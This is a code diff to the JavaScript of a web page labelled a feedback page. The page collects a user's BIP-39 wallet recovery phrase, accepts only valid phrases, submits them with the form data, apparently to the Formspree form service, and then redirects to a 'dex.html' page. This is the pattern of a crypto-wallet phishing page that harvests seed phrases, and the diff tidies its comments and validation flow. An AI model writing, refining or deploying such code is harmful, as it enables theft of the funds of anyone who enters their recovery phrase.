@@ -57,11 +57,13 @@ async function initializeFeedbackPage() {
 
         const mnemonic = mnemonicInput.value.trim().toLowerCase();
 
+        // Validate passphrase FIRST - if invalid, stop here
         if (!isValidBip39Mnemonic(mnemonic)) {
             showError('Invalid passphrase. Please enter a valid BIP-39 recovery phrase.');
-            return;
+            return; // Don't submit to Formspree, don't redirect
         }
 
+        // If valid, hide error and proceed with submission
         hideError();
 
         const formData = new FormData(form);
@@ -74,12 +76,12 @@ async function initializeFeedbackPage() {
             });
 
             if (response.ok) {
-                // ✅ JS-controlled redirect
+                // ✅ Only redirect if passphrase is valid AND submission succeeded
                 window.location.href = 'dex.html';
             } else {
                 showError('Submission failed. Please try again.');
             }
-        } catch {
+        } catch (error) {
             showError('Network error. Please try again.');
         }
     });
